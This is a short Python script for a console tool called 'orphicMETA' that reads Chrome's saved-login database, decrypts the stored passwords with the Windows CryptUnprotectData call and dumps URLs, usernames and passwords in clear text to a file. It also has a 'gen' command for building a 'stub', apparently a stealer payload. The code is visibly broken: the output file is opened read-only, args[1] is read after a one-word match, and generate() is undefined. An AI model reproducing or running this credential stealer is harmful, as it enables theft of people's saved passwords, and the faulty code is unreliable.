from tqdm import tqdm
import win32crypt
import colorama
from colorama import Fore, Style
import sqlite3

def main():

    def decryptFile(file):
        conn = sqlite3.connect(file) 
        cursor = conn.cursor()
        cursor.execute('Select action_url, username_value, password_value FROM logins')
        passfile = open(file+"_decrypt.txt")
        passfile.write("\nChrome Saved Passwords..\n")
        for result in tqdm(cursor.fetchall(), "DECRYPTION"):
            password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
            if password:
                passfile.write('\n[URL]: '+result[0])
                passfile.write('\n[USERNAME]: '+result[1])
                passfile.write('\n[PASSWORD]: ' + str(password))

    def Console():
        main = input("orphicMETA> ")
        args = main.split()

        if(main == "help"):
            print("Fancy help message coming soon...")
            Console()
        elif(main == "decrypt"):
            filename = args[1]
            if(not filename):
                print("USAGE : decrypt <filename>")
                Console()
            else:
                decryptFile(filename)
        elif(main == "gen"):
            stub = args[1]
            if(not stub):
                print("USAGE : gen <filename>") 
            else:
                generate()

    while(True):
        Console()


if __name__ == "__main__":
    main()